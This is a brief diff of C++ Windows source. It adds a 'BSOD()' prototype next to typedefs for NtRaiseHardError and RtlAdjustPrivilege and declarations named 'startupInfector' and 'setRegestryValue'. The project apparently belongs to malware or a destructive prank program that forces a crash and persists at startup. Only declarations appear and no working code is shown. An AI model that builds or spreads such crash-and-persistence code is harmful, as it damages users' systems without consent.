@@ -14,7 +14,7 @@ using std::filesystem::current_path;
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
-
+void BSOD();
 int setRegestryValue(string Location, string Name, string Type, string Data);
 void pouVitalsCheck();
 void startupInfector(string file, string newName);
